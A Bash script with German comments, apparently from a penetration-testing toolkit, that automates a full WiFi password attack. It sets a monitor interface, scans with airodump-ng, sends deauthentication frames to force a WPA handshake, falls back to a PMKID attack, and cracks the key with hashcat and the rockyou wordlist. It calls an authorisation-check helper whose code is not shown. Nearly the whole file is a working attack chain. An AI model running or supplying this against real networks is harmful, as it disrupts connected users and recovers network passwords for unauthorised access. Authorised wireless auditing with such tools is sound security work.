#!/usr/bin/env bash
# wifi-audit-wizard.sh - kompletter WiFi-Audit in einem Lauf
# Fragt minimal, macht: monitor-mode, scan, capture, deauth, hashcat
set -uo pipefail

TOOLKIT="${TOOLKIT:-/mnt/toolkit}"
source "$TOOLKIT/scripts/lib/logging.sh"
source "$TOOLKIT/scripts/lib/auth_check.sh"

log_info "===== WiFi-Audit Wizard ====="
log_info "Erfasse Ziel-Netz (BSSID + Channel) - vorher in targets.yaml!"
echo

iw dev | awk '$1=="Interface"{print "  " $2}'
read -r -p "Interface (z.B. wlan0): " IFACE

# Monitor-Mode falls noetig
if iw dev "$IFACE" info 2>/dev/null | grep -q 'type monitor'; then
    log_ok "$IFACE bereits in Monitor-Mode"
    MON="$IFACE"
else
    bash "$TOOLKIT/scripts/wifi/wifi-monitor-start.sh" "$IFACE"
    MON="$(iw dev | awk '/Interface/ && /mon/ {print $2; exit}')"
    [[ -z "$MON" ]] && MON="${IFACE}mon"
fi

# Quick-Scan
log_info "Scanne 25s..."
outdir="$(make_outdir captures wizard-$(date +%s))"
sudo timeout 25 airodump-ng --output-format csv -w "$outdir/scan" "$MON" >/dev/null 2>&1 || true

csv="$outdir/scan-01.csv"
if [[ ! -f "$csv" ]]; then
    log_err "Scan-Output fehlt"; exit 1
fi

awk -F, 'BEGIN{p=0; n=0} /^BSSID/{p=1; next} /^Station/{p=0} p && length($1)>5 {
    gsub(/^ +| +$/, "", $1); gsub(/^ +| +$/, "", $4); gsub(/^ +| +$/, "", $14)
    if ($14 != "") {
        n++
        printf "  [%d] %s | ch %s | %s\n", n, $1, $4, $14
        bss[n]=$1; ch[n]=$4; essid[n]=$14
    }
} END {
    for (i in bss) print i" "bss[i]" "ch[i]" "essid[i] > "/tmp/wifi-wizard-list"
}' "$csv"

[[ -s /tmp/wifi-wizard-list ]] || { log_err "Keine Netze gefunden"; exit 1; }

read -r -p "Nummer waehlen: " idx
line="$(awk -v i="$idx" '$1==i' /tmp/wifi-wizard-list)"
[[ -z "$line" ]] && { log_err "Ungueltige Wahl"; exit 1; }
BSSID="$(echo "$line" | awk '{print $2}')"
CH="$(echo "$line" | awk '{print $3}')"
SSID="$(echo "$line" | awk '{$1=$2=$3=""; print $0}' | sed 's/^ *//')"

require_auth "$BSSID"
[[ -n "$SSID" ]] && require_auth "$SSID"

# Capture mit deauth
log_info "Capture 60s, mit 3 deauth bei 10s"
prefix="$outdir/cap"
sudo airodump-ng --bssid "$BSSID" --channel "$CH" \
    --write "$prefix" --output-format pcap "$MON" &
APID=$!
sleep 10
sudo aireplay-ng --deauth 3 -a "$BSSID" "$MON" 2>/dev/null || true
sleep 50
sudo kill $APID 2>/dev/null
wait $APID 2>/dev/null

cap="$prefix-01.cap"
if [[ ! -f "$cap" ]]; then
    log_err "Kein Capture"; exit 1
fi

# Konvert
hc="$outdir/cap.hc22000"
hcxpcapngtool -o "$hc" "$cap" 2>/dev/null || true
if [[ ! -s "$hc" ]]; then
    log_warn "Kein Handshake im Capture, versuche PMID-Attack als Fallback"
    bash "$TOOLKIT/scripts/wifi/pmkid-attack.sh" "$MON" "$BSSID" || true
    pmkid="$TOOLKIT/output/captures/pmkid-${BSSID//:/}_$(date +%Y%m%d)*"
    pcap_pm="$(ls -t $pmkid/dump.pcapng 2>/dev/null | head -1)"
    [[ -n "$pcap_pm" ]] && hcxpcapngtool -o "$hc" "$pcap_pm" || true
fi

if [[ ! -s "$hc" ]]; then
    log_err "Weder Handshake noch PMKID. Abbruch."
    exit 1
fi

# Crack
log_info "Cracke mit rockyou (Strg+C bricht ab)"
WL="$TOOLKIT/wordlists/rockyou.txt"
[[ -f "$WL" ]] || { log_err "Wordlist fehlt: $WL"; exit 1; }
hashcat -m 22000 -a 0 "$hc" "$WL" --outfile "$outdir/cracked.txt" --outfile-format=2 || true

hashcat -m 22000 "$hc" --show | tee "$outdir/result.txt"
log_ok "Fertig. Output: $outdir"
